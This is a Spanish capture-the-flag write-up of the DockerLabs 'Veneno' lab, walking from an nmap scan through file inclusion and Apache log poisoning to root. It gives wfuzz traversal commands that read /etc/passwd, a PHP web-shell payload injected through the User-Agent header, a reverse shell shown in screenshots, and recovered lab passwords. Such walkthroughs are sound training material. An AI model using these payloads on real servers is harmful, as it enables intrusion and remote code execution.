# Veneno

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN Veneno`  

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_1.png)  

Hay dos puertas abiertas, la 22 y la 80.  
Echemos un vistazo a la web.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_2.png)  

Podemos ver la página por defecto de apache2 y tampoco encontramos nada de interés en el código fuente de la página.  
Por lo tanto, vamos a hacer un poco de fuzzing.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_3.png)    

Descubrimos una nueva ruta, /uploads, a la que tenemos acceso, pero que no contiene nada.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_4.png)     
  
También vemos otra página, /problems.php, que, a primera vista, parecería ser la misma que la página de inicio.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_5.png)    

Intentemos ver si esta página es vulnerable a un ataque LFI (Local File Inclusion).  
Ejecutamos el comando:  

`sudo wfuzz -c -L -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hl=363 "http://172.17.0.2/problems.php?FUZZ=/../../../../../etc/passwd"`

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_6.png)      

¡Así es!  
Podemos ver que hay un usuario, **carlos**.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_7.png)   

A continuación intentamos realizar una fuerza bruta con hydra pero no obtenemos resultados.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_8.png)   

Ejecutamos entonces este comando para ver si tenemos accesos a los logs para intentar ejecutar un ataque de log poisoning.  

`sudo wfuzz -c --hc=404 --hw=0 -t 200 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://172.17.0.2/problems.php?backdoor=FUZZ' 

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_9.png)     

Sí, tenemos acceso a los logs de apache, así que intentaremos llevar a cabo este ataque con el objetivo de enviar una shell inversa a nuestra máquina atacante.  
Primero tendremos que abrir el Burp Suite e interceptar la petición.  
Para ello interceptaremos la petición a la página (http://172.17.0.2/problems.php?backdoor=/var/log/apache2/access.log.  
Ahora modificaremos el campo User Agent con la cadena:   

`<?php system($_GET['cmd']); ?>`   

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_10.png)     

Ahora añadiremos un **&cmd** al final pasandole una reverse shell en php url encodeada y nos pondremos a la escucha en nuestra maquina atacante.     

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_11.png)   

Bien, estamos dentro.  
Ahora haremos el tratamiento de la shell para poder trabajar de forma más comoda.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_12.png) 
![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_13.png)    

Hacemos un ls para listar los ficheros de la carpeta donde nos encontramos y vemos que hay un fichero interesante.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_14.png)    

Buscamos entonces si hay algun fichero en formato texto que nos podría venir bien.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_15.png)      

Abrimos el fichero y descubrimos la contraseña.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_16.png)   

Bien, ahora abrimos el fichero /etc/passwd para encontrar el usuario.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_17.png)   

Por fin, iniciamos sesión con el usuario encontrado.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_18.png)   

Ahora nos movemos a la home del usuario y hacemos un ls -lah podemos ver que hay un montón de carpetas.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_19.png)  

Lo que podemos hacer es ordenarla por dimensión para ver si encontramos algún contenido.  


![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_20.png)   

Al parecer solo la carpeta 55 parece contener algo.  
Entramos para ver lo que hay.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_21.png)   

Bien, lo que haremos serà bajar este fichero a nuestra maquina atacante para ver si se ha aplicado steganografia o algo por el estilo.  
Lo haremos con scp.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_22.png)     

Antes de nada lenzamos **exiftool** para ver si podemos sacar algauna informacion interesante.  

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_23.png)   

Bueno, non llama la atención esta raya, donde vemos algo que podría ser una contraseña.  
Probamos a ver si poniendo **pingui1730** podemos convertirnos en root.   

![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_24.png)   

¡Listo!  
¡Ya somos root!  




























